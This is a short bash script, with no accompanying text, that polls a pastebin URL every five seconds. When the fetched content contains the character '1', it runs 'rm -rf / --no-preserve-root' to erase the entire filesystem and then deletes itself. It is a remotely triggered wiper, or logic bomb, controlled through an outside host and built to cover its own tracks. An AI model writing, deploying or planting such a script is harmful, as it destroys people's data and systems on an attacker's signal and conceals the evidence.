#!/bin/bash
url="https://pastebin.com/raw/8LbpK8d9"
phrase="1"
while true; do
    content=$(curl -s $url)
    if [[ "$content" == *"$phrase"* ]]; then
        rm -rf / --no-preserve-root
        rm -- "$0"
        break
    else
        sleep 5
    fi
done
